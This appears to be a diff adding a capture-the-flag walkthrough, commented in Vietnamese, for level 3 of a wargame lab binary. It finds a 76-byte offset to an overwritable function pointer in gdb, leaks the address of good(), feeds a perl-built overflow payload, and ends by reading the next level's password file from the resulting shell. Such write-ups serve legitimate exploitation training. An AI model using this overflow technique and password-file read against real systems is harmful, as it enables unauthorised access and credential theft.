@@ -1,0 +1,32 @@
+# Level 3 - Payload / Command
+# Lỗ hổng: memcpy không kiểm tra bound -> tràn buffer -> ghi đè function pointer
+# trên stack (offset 76 byte tính từ đầu buffer), gọi execl("/bin/sh") thay vì
+# nhánh in cảnh báo mặc định.
+
+# 1. Đọc source
+cat /levels/level03.c
+
+# 2. Tìm offset chính xác bằng gdb (không đoán)
+gdb /levels/level03
+disas main
+# -> lea -0x58(%ebp),%eax        : địa chỉ buffer
+# -> movl $0x80484a4,-0xc(%ebp)  : địa chỉ functionpointer, giá trị mặc định = bad
+# -> offset = 0x58 - 0xc = 76 (byte)
+quit
+
+# 3. Leak địa chỉ good() (binary không PIE nên địa chỉ cố định mỗi lần chạy)
+#    Chỉ cần input dài 4-75 ký tự bất kỳ, ví dụ "AAAA" là đủ ngắn để KHÔNG
+#    chạm tới functionpointer (offset 76) nên vẫn gọi nhánh bad() để leak.
+/levels/level03 AAAA
+# -> "you're at 0x80484a4 and you want to be at 0x8048474"
+#    bad = 0x080484a4 | good = 0x08048474
+
+# 4. Payload thật: 76 byte đệm (bị memset xoá, không quan trọng nội dung)
+#    + 4 byte địa chỉ good() little-endian (0x08048474 -> \x74\x84\x04\x08)
+/levels/level03 $(perl -e 'print "A"x76 . "\x74\x84\x04\x08"')
+# -> "This is exciting we're going to 0x8048474"  (đổi từ 0x80484a4)
+# -> "Win."  -> shell mới (quyền level4)
+
+# 5. Trong shell mới, KHÔNG exit trước khi làm bước này:
+id
+cat /home/level4/.pass
